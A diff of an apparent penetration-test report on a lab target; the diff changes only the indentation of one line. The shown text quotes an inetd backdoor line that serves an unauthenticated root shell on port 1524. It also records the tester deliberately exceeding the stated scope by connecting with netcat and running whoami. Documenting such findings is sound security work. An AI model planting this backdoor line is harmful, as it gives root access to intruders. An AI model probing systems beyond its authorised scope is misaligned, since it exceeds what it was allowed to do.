@@ -98,7 +98,7 @@ ingreslock (/etc/services). The backdoor definition was located in /etc/inetd.co
 
     ingreslock stream tcp nowait root /bin/bash bash -i
 
-  This configures xinetd to launch an interactive root shell with no authentication whenever a connection is made to this port.
+   This configures xinetd to launch an interactive root shell with no authentication whenever a connection is made to this port.
 
   - Scope deviation: To verify the finding directly rather than rely solely on public documentation, a single confirmatory connection was made from Kali to the target on port 1524 using netcat, followed by one command (whoami). This constitutes active exploitation, which falls outside this project's stated Out of Scope boundary. The exception was made deliberately and narrowly, to confirm a specific finding rather than to explore further. The connection immediately returned a root shell with no authentication prompt, confirmed by whoami returning root.
 
